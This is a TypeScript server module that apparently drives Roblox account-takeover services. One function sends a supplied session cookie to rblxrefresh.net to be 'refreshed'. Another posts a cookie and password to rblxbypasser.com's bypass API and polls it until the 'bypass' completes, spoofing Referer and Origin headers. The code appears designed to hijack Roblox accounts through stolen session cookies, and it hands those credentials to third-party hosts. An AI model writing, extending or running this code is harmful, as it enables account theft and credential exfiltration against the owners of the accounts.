import { createServerFn } from "@tanstack/react-start";

export const refreshCookie = createServerFn({ method: "POST" })
  .inputValidator((d: { cookie: string }) => d)
  .handler(async ({ data }) => {
    const res = await fetch("https://www.rblxrefresh.net/refreshv2", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
        Referer: "https://www.rblxrefresh.net/",
        Origin: "https://www.rblxrefresh.net",
      },
      body: `cookie=${encodeURIComponent(data.cookie)}`,
    });
    const text = await res.text();
    return { ok: res.ok, result: text };
  });

const BYPASS_BASE = "https://rblxbypasser.com";

async function bypassFetch(path: string, init?: RequestInit) {
  return fetch(`${BYPASS_BASE}${path}`, {
    ...init,
    headers: {
      "User-Agent": "Mozilla/5.0",
      Referer: `${BYPASS_BASE}/`,
      Origin: BYPASS_BASE,
      ...(init?.headers ?? {}),
    },
  });
}

export const bypassAccount = createServerFn({ method: "POST" })
  .inputValidator((d: { cookie: string; version: "v1" | "v2"; password?: string }) => d)
  .handler(async ({ data }) => {
    const initRes = await bypassFetch("/api/bypass", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cookie: data.cookie,
        directoryPath: "",
        version: data.version,
        password: data.version === "v2" ? data.password ?? "" : null,
      }),
    });

    const initTxt = await initRes.text();
    let initJson: any;
    try { initJson = JSON.parse(initTxt); } catch { initJson = { message: initTxt }; }

    if (!initRes.ok || !initJson?.success) {
      return { ok: false, status: initRes.status, data: initJson };
    }

    const payload = initJson.data ?? {};
    const token: string | undefined = payload.token;

    // No token = direct result, return immediately
    if (!token) {
      return { ok: true, status: 200, data: payload };
    }

    // Poll /api/progress until completion (max ~60s)
    for (let i = 0; i < 30; i++) {
      await new Promise((r) => setTimeout(r, 2000));
      const pr = await bypassFetch(`/api/progress?token=${encodeURIComponent(token)}`);
      const ptxt = await pr.text();
      let pjson: any;
      try { pjson = JSON.parse(ptxt); } catch { pjson = { message: ptxt }; }

      const progress = pjson?.progress ?? pjson?.Progress;
      const err = pjson?.error ?? pjson?.Error;

      if (err) {
        return { ok: false, status: pr.status, data: { error: err, ...pjson } };
      }
      if (Number(progress) >= 100) {
        return { ok: true, status: 200, data: pjson };
      }
    }

    return { ok: false, status: 408, data: { error: "Timed out waiting for bypass", token } };
  });

